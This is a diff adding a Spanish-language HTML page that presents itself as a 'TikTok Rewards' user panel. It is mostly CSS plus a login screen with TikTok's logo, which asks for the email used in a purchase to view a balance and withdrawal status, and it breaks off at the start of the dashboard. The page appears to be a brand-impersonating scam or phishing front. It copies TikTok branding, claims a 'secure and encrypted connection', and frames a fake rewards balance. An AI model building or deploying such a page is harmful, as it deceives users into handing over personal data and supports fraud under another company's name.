@@ -1,0 +1,1529 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TikTok Rewards — Panel de Usuario</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --tk-red: #fe2c55;
+      --tk-red-dark: #e0264c;
+      --tk-cyan: #25f4ee;
+      --tk-cyan-dark: #00c4cc;
+      --tk-black: #000000;
+      --tk-white: #ffffff;
+      --tk-bg: #f5f5f7;
+      --tk-card: #ffffff;
+      --tk-border: #e5e7eb;
+      --tk-text: #111111;
+      --tk-text-secondary: #6b7280;
+      --tk-text-muted: #9ca3af;
+      --tk-green: #22c55e;
+      --tk-green-dark: #16a34a;
+      --tk-green-bg: #f0fdf4;
+      --tk-yellow: #f59e0b;
+      --tk-yellow-bg: #fef3c7;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: var(--tk-bg);
+      color: var(--tk-text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ═══════════════════════════════════════
+       ANIMATIONS
+    ═══════════════════════════════════════ */
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes shimmer {
+      0% { background-position: -200% 0; }
+      100% { background-position: 200% 0; }
+    }
+    @keyframes scaleIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes progressPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(34,197,94,0.3); }
+      50% { box-shadow: 0 0 0 6px rgba(34,197,94,0); }
+    }
+    @keyframes countUp {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .animate-in { animation: fadeInUp 0.5s cubic-bezier(0.22, 1, 0.36, 1) both; }
+    .delay-1 { animation-delay: 0.05s; }
+    .delay-2 { animation-delay: 0.1s; }
+    .delay-3 { animation-delay: 0.15s; }
+    .delay-4 { animation-delay: 0.2s; }
+    .delay-5 { animation-delay: 0.25s; }
+    .delay-6 { animation-delay: 0.3s; }
+    .delay-7 { animation-delay: 0.35s; }
+    .delay-8 { animation-delay: 0.4s; }
+
+    /* ═══════════════════════════════════════
+       LOGIN PAGE
+    ═══════════════════════════════════════ */
+    .login-page {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: var(--tk-black);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-page::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: 
+        radial-gradient(ellipse at 20% 50%, rgba(254,44,85,0.08) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 20%, rgba(37,244,238,0.06) 0%, transparent 50%),
+        radial-gradient(ellipse at 60% 80%, rgba(254,44,85,0.04) 0%, transparent 50%);
+      animation: fadeIn 1.5s ease;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 380px;
+      position: relative;
+      z-index: 1;
+      animation: scaleIn 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    .login-card {
+      background: rgba(255,255,255,0.03);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 24px;
+      padding: 40px 28px 36px;
+      text-align: center;
+    }
+
+    .login-logo {
+      margin-bottom: 32px;
+    }
+
+    .login-logo svg {
+      width: 120px;
+      height: auto;
+    }
+
+    .login-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(34,197,94,0.1);
+      border: 1px solid rgba(34,197,94,0.2);
+      color: var(--tk-green);
+      font-size: 11px;
+      font-weight: 600;
+      padding: 6px 12px;
+      border-radius: 99px;
+      margin-bottom: 24px;
+      letter-spacing: 0.02em;
+    }
+
+    .login-badge::before {
+      content: '';
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--tk-green);
+      animation: pulse 2s infinite;
+    }
+
+    .login-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--tk-white);
+      margin-bottom: 8px;
+      letter-spacing: -0.02em;
+      line-height: 1.2;
+    }
+
+    .login-subtitle {
+      font-size: 14px;
+      color: rgba(255,255,255,0.4);
+      margin-bottom: 28px;
+      line-height: 1.5;
+      font-weight: 400;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .input-group {
+      position: relative;
+    }
+
+    .input-group svg {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: rgba(255,255,255,0.25);
+      width: 18px;
+      height: 18px;
+    }
+
+    .login-input {
+      width: 100%;
+      padding: 15px 16px 15px 44px;
+      border-radius: 14px;
+      border: 1px solid rgba(255,255,255,0.08);
+      background: rgba(255,255,255,0.04);
+      color: var(--tk-white);
+      font-size: 15px;
+      font-family: inherit;
+      font-weight: 500;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    .login-input::placeholder {
+      color: rgba(255,255,255,0.25);
+      font-weight: 400;
+    }
+
+    .login-input:focus {
+      border-color: var(--tk-red);
+      background: rgba(254,44,85,0.04);
+      box-shadow: 0 0 0 3px rgba(254,44,85,0.1);
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 14px;
+      border: none;
+      background: var(--tk-red);
+      color: var(--tk-white);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      letter-spacing: 0.01em;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .login-btn:hover {
+      background: var(--tk-red-dark);
+      transform: translateY(-1px);
+      box-shadow: 0 8px 24px rgba(254,44,85,0.3);
+    }
+
+    .login-btn:active {
+      transform: scale(0.98) translateY(0);
+    }
+
+    .login-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .login-btn .btn-loader {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .login-btn.loading span { display: none; }
+    .login-btn.loading .btn-loader { display: block; }
+
+    .login-error {
+      color: var(--tk-red);
+      font-size: 12px;
+      font-weight: 500;
+      margin-top: 4px;
+      display: none;
+      animation: slideDown 0.3s ease;
+    }
+
+    .login-footer {
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(255,255,255,0.05);
+    }
+
+    .login-footer p {
+      font-size: 11px;
+      color: rgba(255,255,255,0.2);
+      line-height: 1.5;
+    }
+
+    .login-security {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 12px;
+      font-size: 11px;
+      color: rgba(255,255,255,0.3);
+      font-weight: 500;
+    }
+
+    .login-security svg {
+      width: 12px;
+      height: 12px;
+    }
+
+    /* ═══════════════════════════════════════
+       DASHBOARD
+    ═══════════════════════════════════════ */
+    .dashboard-page {
+      display: none;
+      min-height: 100vh;
+      background: var(--tk-bg);
+    }
+
+    .dashboard-page.active {
+      display: block;
+    }
+
+    .login-page.hidden {
+      display: none;
+    }
+
+    /* Top Bar */
+    .topbar {
+      background: var(--tk-black);
+      padding: 0 20px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .topbar-inner {
+      max-width: 600px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 56px;
+    }
+
+    .topbar-logo svg {
+      width: 80px;
+      height: auto;
+    }
+
+    .topbar-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .topbar-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--tk-red), var(--tk-cyan));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .topbar-email {
+      font-size: 12px;
+      color: rgba(255,255,255,0.5);
+      font-weight: 500;
+      max-width: 150px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .topbar-logout {
+      background: none;
+      border: none;
+      color: rgba(255,255,255,0.3);
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 8px;
+      transition: all 0.2s;
+      display: flex;
+    }
+
+    .topbar-logout:hover {
+      color: var(--tk-red);
+      background: rgba(254,44,85,0.1);
+    }
+
+    /* Content */
+    .dashboard-content {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 16px 40px;
+    }
+
+    /* Status Banner */
+    .status-banner {
+      background: linear-gradient(135deg, rgba(34,197,94,0.08), rgba(34,197,94,0.03));
+      border: 1px solid rgba(34,197,94,0.15);
+      border-radius: 14px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--tk-green);
+      flex-shrink: 0;
+      animation: pulse 2s infinite;
+    }
+
+    .status-text {
+      font-size: 13px;
+      color: var(--tk-green-dark);
+      font-weight: 600;
+    }
+
+    .status-text span {
+      font-weight: 400;
+      color: #4b5563;
+    }
+
+    /* Balance Card */
+    .balance-card {
+      background: var(--tk-black);
+      border-radius: 20px;
+      padding: 28px 24px;
+      color: white;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .balance-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 200px;
+      height: 200px;
+      background: radial-gradient(circle, rgba(254,44,85,0.15) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .balance-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 150px;
+      height: 150px;
+      background: radial-gradient(circle, rgba(37,244,238,0.1) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .balance-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: rgba(255,255,255,0.4);
+      margin-bottom: 8px;
+    }
+
+    .balance-amount {
+      font-size: 42px;
+      font-weight: 900;
+      letter-spacing: -0.03em;
+      line-height: 1;
+      margin-bottom: 4px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .balance-amount .currency {
+      font-size: 24px;
+      font-weight: 700;
+      vertical-align: top;
+      margin-right: 2px;
+      color: rgba(255,255,255,0.6);
+    }
+
+    .balance-sub {
+      font-size: 13px;
+      color: rgba(255,255,255,0.35);
+      font-weight: 500;
+      position: relative;
+      z-index: 1;
+    }
+
+    .balance-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: rgba(34,197,94,0.15);
+      color: #4ade80;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 5px 10px;
+      border-radius: 8px;
+      margin-top: 16px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .balance-badge svg {
+      width: 12px;
+      height: 12px;
+    }
+
+    /* Info Cards */
+    .card {
+      background: var(--tk-card);
+      border-radius: 16px;
+      border: 1px solid var(--tk-border);
+      padding: 20px;
+      margin-bottom: 12px;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .card-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--tk-text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .card-title svg {
+      width: 18px;
+      height: 18px;
+      color: var(--tk-text-muted);
+    }
+
+    .card-badge {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 8px;
+      letter-spacing: 0.02em;
+    }
+
+    .card-badge.green {
+      background: var(--tk-green-bg);
+      color: var(--tk-green-dark);
+    }
+
+    .card-badge.yellow {
+      background: var(--tk-yellow-bg);
+      color: #92400e;
+    }
+
+    /* Timeline */
+    .timeline {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .timeline-item {
+      display: flex;
+      gap: 14px;
+      padding: 12px 0;
+      position: relative;
+    }
+
+    .timeline-item:not(:last-child) {
+      border-bottom: 1px solid #f3f4f6;
+    }
+
+    .timeline-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .timeline-icon.done {
+      background: var(--tk-green-bg);
+      color: var(--tk-green);
+    }
+
+    .timeline-icon.active {
+      background: rgba(254,44,85,0.08);
+      color: var(--tk-red);
+      animation: progressPulse 2s infinite;
+    }
+
+    .timeline-icon.pending {
+      background: #f3f4f6;
+      color: var(--tk-text-muted);
+    }
+
+    .timeline-icon svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    .timeline-content {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .timeline-title {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--tk-text);
+      margin-bottom: 2px;
+    }
+
+    .timeline-desc {
+      font-size: 12px;
+      color: var(--tk-text-muted);
+      font-weight: 400;
+    }
+
+    .timeline-time {
+      font-size: 11px;
+      color: var(--tk-text-muted);
+      font-weight: 500;
+      white-space: nowrap;
+      align-self: center;
+    }
+
+    /* Info Rows */
+    .info-grid {
+      display: grid;
+      gap: 12px;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #f9fafb;
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+
+    .info-label {
+      font-size: 13px;
+      color: var(--tk-text-muted);
+      font-weight: 500;
+    }
+
+    .info-value {
+      font-size: 13px;
+      color: var(--tk-text);
+      font-weight: 600;
+      text-align: right;
+    }
+
+    .info-value.green { color: var(--tk-green-dark); }
+
+    /* Notice */
+    .notice-card {
+      background: linear-gradient(135deg, #fffbeb, #fef3c7);
+      border: 1px solid #fde68a;
+      border-radius: 14px;
+      padding: 16px;
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .notice-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      background: rgba(245,158,11,0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: var(--tk-yellow);
+    }
+
+    .notice-icon svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    .notice-text {
+      font-size: 13px;
+      color: #78350f;
+      line-height: 1.5;
+      font-weight: 500;
+    }
+
+    .notice-text strong {
+      font-weight: 700;
+    }
+
+    /* Support Button */
+    .support-btn {
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      border: 1px solid var(--tk-border);
+      background: var(--tk-card);
+      color: var(--tk-text);
+      font-size: 14px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .support-btn:hover {
+      border-color: var(--tk-text-muted);
+      background: #fafafa;
+    }
+
+    .support-btn svg {
+      width: 16px;
+      height: 16px;
+      color: var(--tk-text-muted);
+    }
+
+    /* Footer */
+    .dashboard-footer {
+      text-align: center;
+      padding: 20px 0;
+      margin-top: 8px;
+    }
+
+    .dashboard-footer p {
+      font-size: 11px;
+      color: var(--tk-text-muted);
+      line-height: 1.6;
+    }
+
+    .dashboard-footer .footer-logo {
+      margin-bottom: 8px;
+    }
+
+    .dashboard-footer .footer-logo svg {
+      width: 60px;
+      height: auto;
+      opacity: 0.2;
+    }
+
+    /* ═══════════════════════════════════════
+       SUPPORT CHAT
+    ═══════════════════════════════════════ */
+    .chat-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      align-items: flex-end;
+      justify-content: center;
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      padding: 0;
+    }
+    .chat-overlay.active { display: flex; }
+
+    .chat-window {
+      width: 100%;
+      max-width: 420px;
+      height: 88vh;
+      max-height: 640px;
+      background: var(--tk-bg);
+      border-radius: 20px 20px 0 0;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 -10px 60px rgba(0,0,0,0.3);
+      transform: translateY(20px);
+      opacity: 0;
+      transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    .chat-overlay.active .chat-window {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .chat-header {
+      background: var(--tk-black);
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+    }
+    .chat-header-avatar {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--tk-red), var(--tk-cyan));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .chat-header-avatar svg { width: 22px; height: 22px; }
+    .chat-header-info { flex: 1; min-width: 0; }
+    .chat-header-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--tk-white);
+      line-height: 1.2;
+    }
+    .chat-header-status {
+      font-size: 11px;
+      color: rgba(255,255,255,0.5);
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin-top: 2px;
+    }
+    .chat-header-status::before {
+      content: '';
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--tk-green);
+      animation: pulse 2s infinite;
+    }
+    .chat-close {
+      background: none;
+      border: none;
+      color: rgba(255,255,255,0.4);
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 8px;
+      display: flex;
+      transition: all 0.2s;
+    }
+    .chat-close:hover { color: var(--tk-white); background: rgba(255,255,255,0.08); }
+    .chat-close svg { width: 20px; height: 20px; }
+
+    .chat-messages {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .chat-msg {
+      max-width: 80%;
+      padding: 10px 14px;
+      font-size: 13.5px;
+      line-height: 1.45;
+      border-radius: 16px;
+      animation: countUp 0.3s ease both;
+      word-wrap: break-word;
+    }
+    .chat-msg.bot {
+      align-self: flex-start;
+      background: var(--tk-white);
+      color: var(--tk-text);
+      border: 1px solid var(--tk-border);
+      border-bottom-left-radius: 5px;
+    }
+    .chat-msg.user {
+      align-self: flex-end;
+      background: var(--tk-red);
+      color: var(--tk-white);
+      font-weight: 500;
+      border-bottom-right-radius: 5px;
+    }
+
+    .chat-typing {
+      align-self: flex-start;
+      background: var(--tk-white);
+      border: 1px solid var(--tk-border);
+      border-radius: 16px;
+      border-bottom-left-radius: 5px;
+      padding: 12px 16px;
+      display: flex;
+      gap: 4px;
+      animation: countUp 0.3s ease both;
+    }
+    .chat-typing span {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--tk-text-muted);
+      animation: typingDot 1.2s infinite ease-in-out;
+    }
+    .chat-typing span:nth-child(2) { animation-delay: 0.2s; }
+    .chat-typing span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes typingDot {
+      0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
+      30% { transform: translateY(-5px); opacity: 1; }
+    }
+
+    .chat-quick-replies {
+      flex-shrink: 0;
+      padding: 10px 12px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      border-top: 1px solid var(--tk-border);
+      background: var(--tk-card);
+      max-height: 42%;
+      overflow-y: auto;
+    }
+    .chat-chip {
+      background: var(--tk-white);
+      border: 1.5px solid var(--tk-border);
+      color: var(--tk-text);
+      font-family: inherit;
+      font-size: 12.5px;
+      font-weight: 600;
+      padding: 9px 13px;
+      border-radius: 99px;
+      cursor: pointer;
+      transition: all 0.2s;
+      line-height: 1.2;
+    }
+    .chat-chip:hover {
+      border-color: var(--tk-red);
+      color: var(--tk-red);
+      background: rgba(254,44,85,0.04);
+    }
+    .chat-chip:active { transform: scale(0.97); }
+
+    .chat-input-bar {
+      flex-shrink: 0;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--tk-card);
+      border-top: 1px solid var(--tk-border);
+    }
+    .chat-input-bar input {
+      flex: 1;
+      border: 1px solid var(--tk-border);
+      background: var(--tk-bg);
+      border-radius: 99px;
+      padding: 11px 16px;
+      font-family: inherit;
+      font-size: 13px;
+      color: var(--tk-text);
+      outline: none;
+    }
+    .chat-input-bar input:disabled { cursor: not-allowed; }
+    .chat-input-send {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: none;
+      background: var(--tk-red);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .chat-input-send svg { width: 18px; height: 18px; }
+
+    @media (prefers-reduced-motion: reduce) {
+      .chat-window, .chat-msg, .chat-typing { animation: none; transition: none; }
+      .chat-typing span, .chat-header-status::before { animation: none; }
+    }
+
+    /* Responsive */
+    @media (max-width: 400px) {
+      .balance-amount {
+        font-size: 36px;
+      }
+      .topbar-email {
+        display: none;
+      }
+    }
+    @media (min-width: 481px) {
+      .chat-overlay { align-items: center; }
+      .chat-window { border-radius: 20px; height: 82vh; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ═══════════════════════════════════════
+       LOGIN PAGE
+  ═══════════════════════════════════════ -->
+  <div class="login-page" id="loginPage">
+    <div class="login-container">
+      <div class="login-card">
+        <div class="login-logo">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 102 30" fill="none">
+            <path d="M9.49 21.35l.1.28c-.02-.03-.05-.13-.1-.28zM4.92 19.37c.17-1.49.76-2.33 1.87-3.18 1.58-1.16 3.56-.5 3.56-.5v-3.9c.48-.01.96.02 1.44.09v5.01s-1.98-.66-3.56.5c-1.1.86-1.69 1.69-1.86 3.18-.01.82.14 1.88.81 2.79-.17-.09-.33-.19-.51-.3-1.48-1.04-1.75-2.59-1.75-3.69zM19.94 4.59c-1.09-1.24-1.5-2.5-1.65-3.38h1.37s-.27 2.31 1.66 4.59l.03.03c-.54-.35-1.03-.77-1.47-1.24z" fill="#EE1D52"/>
+            <path d="M26.54 8.12v4.91s-1.75-.07-3.04-.41c-1.81-.48-2.97-1.22-2.97-1.22s-.8-.53-.87-.56V21c0 .56-.15 1.97-.6 3.15-.59 1.54-1.5 2.55-1.67 2.75 0 0-1.11 1.37-3.06 2.29-1.76.83-3.31.81-3.77.83 0 0-2.67.11-5.08-1.52-.52-.36-1-.77-1.45-1.22l.01.01c2.4 1.63 5.08 1.52 5.08 1.52.46-.02 2.01-.01 3.77-.83 1.95-.92 3.06-2.28 3.06-2.28.17-.21 1.08-1.22 1.67-2.75.45-1.18.6-2.59.6-3.15V9.63c.06.04.87.56.87.56s1.16.74 2.97 1.22c1.29.34 3.04.41 3.04.41V7.98c.6.14 1.11.18 1.44.14z" fill="#EE1D52"/>
+            <path d="M25.1 7.98v3.85s-1.75-.07-3.04-.42c-1.81-.48-2.97-1.21-2.97-1.21s-.8-.53-.87-.57v10.14c0 .56-.15 1.97-.6 3.15-.59 1.54-1.5 2.55-1.67 2.75 0 0-1.11 1.37-3.06 2.29-1.76.83-3.31.81-3.77.83 0 0-2.67.11-5.07-1.52-.26-.27-.5-.54-.72-.82-.77-.98-1.24-2.13-1.36-2.46 0 0-.19-.57-.13-1.9.1-2.35.89-3.79 1.1-4.15a10.4 10.4 0 012.13-2.6 8.5 8.5 0 012.53-1.5c.58-.24 1.17-.41 1.79-.52.45-.08.9-.13 1.36-.14v3.89s-1.98-.66-3.56.5c-1.1.86-1.69 1.69-1.86 3.18-.01.82.14 1.88.81 2.79.17.11.34.22.51.31.26.35.57.65.93.9 1.44.95 2.65 1.02 4.2.4 1.03-.41 1.8-1.34 2.17-2.38.23-.65.23-1.3.23-1.97V1.21h3.6c.15.88.56 2.14 1.65 3.38.44.47.93.89 1.47 1.24.16.17.97 1.02 2.01 1.52.54.27 1.1.47 1.69.61z" fill="#000"/>
+            <path d="M.54 22.79v.01l.09.25c-.01-.03-.04-.12-.09-.25z" fill="#69C9D0"/>
+            <path d="M7.2 12.45a8.5 8.5 0 00-2.53 1.5 10.4 10.4 0 00-2.13 2.61c-.21.36-1 1.8-1.1 4.15-.05 1.33.35 2.71.54 3.28 0 0 .12.33.47 1.16.23.28.47.55.72.82-.77-.56-1.49-1.24-2.1-2.02-.77-.97-1.24-2.11-1.36-2.45l-.01-.01c-.19-.57-.39-1.94-.34-3.27.1-2.35.89-3.79 1.1-4.15a10.4 10.4 0 012.13-2.61 8.5 8.5 0 012.53-1.5c.58-.24 1.17-.41 1.79-.52a12 12 0 011.79-.15v1.11c-.45.01-.9.05-1.36.14-.61.11-1.2.29-1.79.52z" fill="#69C9D0"/>
+            <path d="M18.3 1.21h-3.6V20.32c0 .67 0 1.32-.23 1.97-.37 1.03-1.14 1.97-2.17 2.38-1.55.62-2.76.55-4.2-.4-.36-.25-.67-.55-.93-.9 1.23.66 2.33.64 3.7.1 1.02-.42 1.8-1.35 2.17-2.38.23-.65.22-1.3.22-1.97V0h4.97s-.06.48.07 1.21zM25.1 6.91v1.06c-.58-.14-1.15-.34-1.69-.61-1.04-.52-1.85-1.37-2.01-1.54.18.12.37.23.57.33 1.26.63 2.51.82 3.12.76z" fill="#69C9D0"/>
+            <path d="M34.34 7.95h11.24l-1.04 3.1h-2.94v11.84h-3.62V11.04h-3.64V7.95zM64.14 7.95v3.1h3.64v11.84h3.62V11.04h2.94l1.04-3.1H64.14zM48.03 11.48a1.75 1.75 0 10-.01-3.5 1.75 1.75 0 00.01 3.5zM46.27 22.88h3.55V12.71h-3.55v10.17zM62.59 11.39h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.81l-5.01-7.15 4.34-4.34zM96.64 15.73l4.34-4.34h-4.15l-3.58 3.58V7.96h-3.53l-.01 14.92h3.56V18.9l1.11-1 3.46 4.89h3.8l-5.01-7.15zM87.52 16.84c0 3.37-2.77 6.11-6.19 6.11s-6.19-2.73-6.19-6.11c0-3.37 2.77-6.11 6.19-6.11s6.19 2.74 6.19 6.11zm-3.15 0a3.04 3.04 0 10-6.08 0 3.04 3.04 0 006.08 0z" fill="#000"/>
+            <path d="M78.3 16.88c0 .27.04.55.12.81l.02.05a2.3 2.3 0 001.1 1.54c.52.38 1.15.59 1.8.59v3.07c-1.49 0-2.57.05-4.19-.96-1.86-1.1-2.91-3.11-2.91-5.2 0-2.15 1.17-4.31 3.15-5.35 1.44-.75 2.53-.76 3.95-.76v3.07a3.06 3.06 0 00-3.04 3.04v.04z" fill="#69C9D0"/>
+            <path d="M84.39 16.88c0 .27-.04.55-.12.81l-.02.05a2.3 2.3 0 01-1.1 1.54c-.52.38-1.15.59-1.8.59v3.07c1.5 0 2.57.05 4.2-.96 1.86-1.1 2.91-3.11 2.91-5.2 0-2.15-1.17-4.31-3.15-5.35-1.44-.75-2.53-.76-3.96-.76v3.07a3.06 3.06 0 013.04 3.04v.04z" fill="#EE1D52"/>
+          </svg>
+        </div>
+
+        <div class="login-badge">Panel de Recompensas</div>
+
+        <h1 class="login-title">Accede a tu panel</h1>
+        <p class="login-subtitle">Introduce el email usado en tu compra para ver tu saldo y estado de retiro.</p>
+
+        <form class="login-form" id="loginForm" onsubmit="return handleLogin(event)">
+          <div class="input-group">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+            <input type="email" class="login-input" id="emailInput" placeholder="tu@email.com" required autocomplete="email">
+          </div>
+          <div class="login-error" id="loginError">Por favor, introduce un email válido</div>
+          <button type="submit" class="login-btn" id="loginBtn">
+            <span>Acceder al panel</span>
+            <div class="btn-loader"></div>
+          </button>
+        </form>
+
+        <div class="login-footer">
+          <p>Al acceder, aceptas los términos de uso y la política de privacidad de TikTok.</p>
+          <div class="login-security">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Conexión segura y encriptada
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════
+       DASHBOARD PAGE
+  ═══════════════════════════════════════ -->
+  <div class="dashboard-page" id="dashboardPage">
+    <!-- Top Bar -->
+    <div class="topbar">
+      <div class="topbar-inner">
+        <div class="topbar-logo">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 102 30" fill="none">
